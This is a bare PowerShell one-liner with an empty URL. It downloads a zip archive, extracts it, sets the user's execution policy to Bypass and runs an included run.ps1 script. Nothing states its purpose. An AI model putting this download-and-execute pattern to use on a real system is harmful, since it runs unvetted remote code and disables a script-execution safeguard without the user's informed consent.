$url=""; $t = New-TemporaryFile; rni $t.FullName "$($t.BaseName).zip" -PassThru; iwr $url -OutFile "$($t.BaseName).zip"; Expand-Archive "$($t.BaseName).zip" -DestinationPath $t.BaseName; Set-ExecutionPolicy Bypass CurrentUser -Force; cd $t.BaseName; .\run.ps1
